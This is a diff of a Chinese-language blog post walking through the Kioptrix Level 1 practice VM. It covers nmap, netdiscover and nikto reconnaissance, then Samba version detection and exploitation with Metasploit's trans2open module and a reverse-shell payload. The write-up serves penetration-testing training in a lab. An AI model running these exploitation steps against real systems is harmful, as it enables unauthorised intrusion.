@@ -191,22 +191,61 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<h1><span id="kioptrix-level1">kioptrix level1</span></h1><h2><span id="获取信息">获取信息</span></h2><ol>
-<li>namp信息收集</li>
-<li>arp-scan发现主机</li>
-<li>netdiscover发现主机</li>
-</ol>
-<p>nmap -n -sn -sP 192.168.135.*</p>
-<p>arp-scan -l</p>
-<p>netdiscover -r 192.168.135.0/24</p>
-<p><img src="C:\Users\86157\AppData\Roaming\Typora\typora-user-images\image-20211111104456383.png" alt="image-20211111104456383"></p>
-<p>目录扫描</p>
-<p>dirb 192.168.135.254</p>
-<p>扫描漏洞</p>
-<p>nikto -h  192.168.135.254</p>
-<p>namp扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-p-:扫描全端口-65535-</span><br><span class="line">-sV:扫描服务版本</span><br><span class="line">-sS:TCP SYN扫描，也称为密码扫描</span><br><span class="line">-T4:扫描时序(0-5),数字越大，速度越快</span><br></pre></td></tr></table></figure>
+      		<h1><span id="kioptrix-level1">kioptrix level1</span></h1><p>准备阶段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali  ip:192.168.135.128</span><br><span class="line">靶机   </span><br><span class="line">(这里需要把靶机设为nat连接)</span><br></pre></td></tr></table></figure>
 
+<p><img src="image-20211116170922006.png" alt="image-20211116170922006"></p>
+<h2><span id="信息搜集">信息搜集</span></h2><p>探测靶机ip</p>
+<p>因为是本地nat连接，所以仅需要C段扫描</p>
+<p>nmap -sS -sV 192.168.135.*</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-sS 使用SYN半开式扫描，又称隐身扫描  -sV 服务探测</span><br><span class="line">-T4:扫描时序(0-5),数字越大，速度越快</span><br><span class="line">-p-:扫描全端口-65535-</span><br></pre></td></tr></table></figure>
+
+<p>这是几个比较常用的，其他的想要了解推荐这个大牛：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bujingyun/p/9910797.html">https://www.cnblogs.com/bujingyun/p/9910797.html</a> </p>
+<p><img src="image-20211116171452457.png" alt="image-20211116171452457"></p>
+<p>得到ip：192.168.135.144   系统是linux  还有一些端口开放情况</p>
+<p>这里把ip和开放的端口都扫出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.135.0/24</span><br></pre></td></tr></table></figure>
+
+<p>这个扫描比较慢，但也会比较全一些</p>
+<p>扫描漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.135.144</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获得ip之后我们可以访问这个服务器试试，是个apache的首页没啥东西</p>
+<p><img src="image-20211116194318519.png" alt="image-20211116194318519"></p>
+<p>那我们可以从端口下手</p>
+<p>从上边的漏洞和端口扫描情况最明显的是samba漏洞了</p>
+<p><img src="image-20211116194514555.png" alt="image-20211116194514555"></p>
+<h2><span id="搜索漏洞">搜索漏洞</span></h2><p>利用searchsploit搜索这个设备的漏洞</p>
+<p><img src="image-20211116194639299.png" alt="image-20211116194639299"></p>
+<p>可以见的有好多，然后我们可以用msf的辅助工具来探测目标服务器的samba的版本</p>
+<p>调用msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">搜索模板</span><br><span class="line">search smb_version    </span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211116194843276.png" alt="image-20211116194843276"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">调用模板</span><br><span class="line">se auxiliry/scanner/smb/smb_version</span><br><span class="line">查看options,并根据options里要求的设置</span><br><span class="line">options</span><br><span class="line">set rhost 192.168.135.144</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211116194946599.png" alt="image-20211116194946599"></p>
+<p>这里我们探测到目标服务器的samba是2.2.1a版本</p>
+<p>回到searchsploit，精确搜索</p>
+<p><img src="image-20211116195242736.png" alt="image-20211116195242736"></p>
+<h2><span id="利用漏洞攻击">利用漏洞攻击</span></h2><p>有四个漏洞利用方法，我们先选第一个msf的trans2open</p>
+<p><img src="image-20211116195648296.png" alt="image-20211116195648296"></p>
+<p>进入msfconsole 对samba进行相对精确的搜索，因为前边我们查询到目标系统是linux的，所以建议选择第三个</p>
+<p><img src="image-20211116195839060.png" alt="image-20211116195839060"></p>
+<p>然后挂载攻击载荷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>这个地方需要注意我们需要修改挂载的载荷，因为新版本的msf默认提供的这个载荷是针对较新版本的linux的，是基于内存的攻击，而我们的目标靶机版本较老，需要改成之前的基于cmd的攻击模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x86/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>然后配置rhost进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.135.144</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211116200458866.png" alt="image-20211116200458866"></p>
+<p><img src="image-20211116200549150.png" alt="image-20211116200549150"></p>
+<p><img src="image-20211116200636668.png" alt="image-20211116200636668"></p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
